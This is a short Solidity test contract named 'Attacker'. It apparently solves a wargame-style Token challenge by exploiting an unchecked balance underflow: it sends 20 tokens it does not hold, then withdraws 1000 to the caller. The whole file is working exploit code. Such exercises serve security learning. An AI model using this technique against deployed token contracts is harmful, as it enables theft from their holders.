// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/IToken.sol";
import "custom_lib/Console.sol";
import "custom_lib/Test.sol";

contract Attacker is Test, Console {
    Token instance = Token(payable(0xa4516EF85aA1c5D81988c82ccDE5192f0c4EaD25));
    function test() external {
        log("msg sender", msg.sender);
        log("Initial balance", instance.balanceOf(msg.sender));
        instance.transfer(address(this), 20);
        log("Current balance", instance.balanceOf(msg.sender));
        withdraw();
        log("Final balance", instance.balanceOf(msg.sender));
    }

    function withdraw() public payable {
        log("Withdraw");
        instance.transfer(msg.sender, 1000);
    }
}